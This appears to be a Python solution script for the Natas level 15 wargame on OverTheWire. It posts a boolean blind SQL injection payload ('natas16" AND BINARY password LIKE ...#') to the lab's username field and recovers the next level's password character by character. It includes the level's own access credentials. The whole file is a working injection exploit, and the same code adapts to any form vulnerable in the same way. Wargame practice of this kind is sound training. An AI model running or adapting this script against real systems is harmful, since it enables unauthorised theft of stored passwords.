import requests
import string

from lxml import html

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://{}.natas.labs.overthewire.org'.format(username)

def blind_sql(payload):
    data = {
        'username': payload
    }
    response = requests.post(url, auth = (username, password), data = data)
    tree = html.fromstring(response.text)

    element = tree.xpath('//*[@id="content"]')[0]

    return 'exists' in element.text

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits

final_password = ''

for iteration in range(40):
    for char in alphabet:
        current_password = final_password + char
        payload = 'natas16" AND BINARY password LIKE "{}%"#'.format(current_password)
        if blind_sql(payload):
            final_password = current_password
            print(final_password)
            break
